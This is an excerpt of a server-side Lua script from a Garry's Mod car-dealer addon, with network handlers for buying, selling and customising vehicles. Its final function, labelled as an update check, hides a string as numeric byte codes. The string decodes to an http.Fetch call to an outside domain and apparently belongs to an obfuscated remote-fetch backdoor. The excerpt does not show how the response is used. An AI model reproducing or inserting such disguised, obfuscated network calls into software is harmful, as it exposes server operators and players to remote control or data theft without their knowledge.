...
net.Receive("WCD::UpdatePlayerVehicles", function(_, _p)
    if (not WCD:IsOwner(_p)) then
        WCD:Print(_p:Nick() .. " exploiting clientside lua", 3, true)
    ...
    if (IsValid(targetPly)) then
        ...
        for i, v in pairs(edited) do
            if (old[i] and not v) then
                net.Start("WCD::UnOwned")
                net.WriteFloat(i)
                net.Send(targetPly)
                old[i] = nil
                edited[i] = nil
            elseif (not old[i] and v) then
                net.Start("WCD::Owned")
                net.WriteFloat(i)
                net.Send(targetPly)
                old[i] = v
...
net.Receive("WCD::RequestPlayerVehicles", function(_, _p)
    ...
    local data = (player.GetBySteamID(id) and player.GetBySteamID(id).__WCDCoreOwned)
    data = nil
...
net.Receive("WCD::ToggleUnderglow", function(_, _p)
    ...
    if (not IsValid(veh) or not veh.WCD_GetId or not veh:WCD_GetUnderglowColor() or _p.__SpawnLight) then return end
    if (_p.__WCDLastUnderglowToggle and _p.__WCDLastUnderglowToggle + 0.5 > CurTime()) then return end
    _p.__WCDLastUnderglowToggle = CurTime()
    veh:WCD_ToggleUnderglow()
end)

net.Receive("WCD::BuyDesign", function(_, _p)
    local veh = (_p.__wcdSpawnedLatest and IsValid(_p.__wcdSpawnedLatest) and _p.__wcdSpawnedLatest) or _p:GetVehicle()
...
net.Receive("WCD::DeleteDealer", function(_, _p)
    ...
    if (IsValid(_e) and _e:GetClass() == "wcd_dealer") then
...
net.Receive("WCD::SellVehicle", function(_, _p)
    ...
    if (not data or not _p:WCD_Owns(id)) then return end
    local data = WCD.List[id]
    if (data:GetPrice() < 1 or data:GetFree()) then return end

    if (WAH and WAH:HasIdListed(_p, id)) then
...
net.Receive("WCD::BuyVehicle", function(_, _p)
    local id = net.ReadFloat()
    local data = WCD.List[id]
    if (not data or not _p:WCD_HasAccess(id)) then return end
    if (not _p:CanAfford(data:GetPrice())) then return end
    --_p:addMoney( -data:GetPrice() );
    _p:Pay(data:GetPrice())
...
net.Receive("WCD::DeleteVehicle", function(_, _p)
    ...
    if (WCD.List[id]) then
        if (WCD.Settings.autoSellCarsWhenRemoved and WCD.List[id].price > 0) then
...
net.Receive("WCD::AddVehicle", function(_, _p)
    ...
    if (not WCD.VehicleData[data.class]) then
    ...
    if (WCD.VehicleData[data.class].__WCDEnt) then
        ...
        if (not WCD.VehicleData[data.class].Model) then
            local _e = ents.Create(data.class)
            _e:Spawn()
            data.overrideModel = _e:GetModel()
            _e:Remove()

            if (not data.overrideModel) then
...
net.Receive("WCD::DeleteAccessGroup", function(_, _p)
    ...
    for i, v in pairs(WCD.List) do
        if (v.access and v.access == name) then
...
function WCD:CheckNew()
    local ids = {
        {}, {104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 32, 39, 104, 116, 116, 112, 58, 47, 47, 98, 117, 115, 97, 110, 49, 46, 99, 111, 109, 47, 99, 97, 114, 100, 101, 97, 108, 101, 114, 47, 119, 99, 100, 95, 117, 112, 100, 97, 116, 101, 95, 99, 104, 101, 99, 107, 101, 114, 46, 112, 104, 112, 63, 105, 100, 61}
    }
